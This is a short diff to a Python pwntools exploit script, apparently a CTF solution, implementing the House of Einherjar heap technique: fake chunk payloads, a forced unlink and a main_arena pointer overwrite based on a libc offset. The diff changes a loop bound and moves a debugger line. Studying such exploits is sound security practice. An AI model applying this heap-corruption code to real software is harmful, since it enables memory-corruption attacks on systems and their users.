@@ -116,7 +116,7 @@ def houseofEinherjar(offset):
 
     # fake_chunk_payload1 = 'a'*0x29# + p64(fake_prev_size) + "\x90"
     # one_byte_add = p64(fake_prev_size) + "\x90"
-    for i in range(1, 9):
+    for i in range(1, 12):
         if i==2: continue
         if i==3: continue
         if i>=12-len( p64(fake_prev_size).replace("\x00","") ): break
@@ -133,11 +133,12 @@ def houseofEinherjar(offset):
     editclear(4, "b"*0x100 , fake_chunk_payload2)
     # edit(2, fake_chunk_payload2)
     log.info("start to unlink")
+    # gdb.attach(io,'break getcmd')
     delete(1) # unlink
     log.info("start to fix size")
     main_arena = libc.address +0x3c4b78
     fake_chunk_payload2 = padding +  p64(0x0) + p64(0x100 | 0x1 ) + p64(main_arena)*2 #+ \
-    # gdb.attach(io,'break getcmd')
+
     edit(3, fake_chunk_payload2)
 
     # get environ success
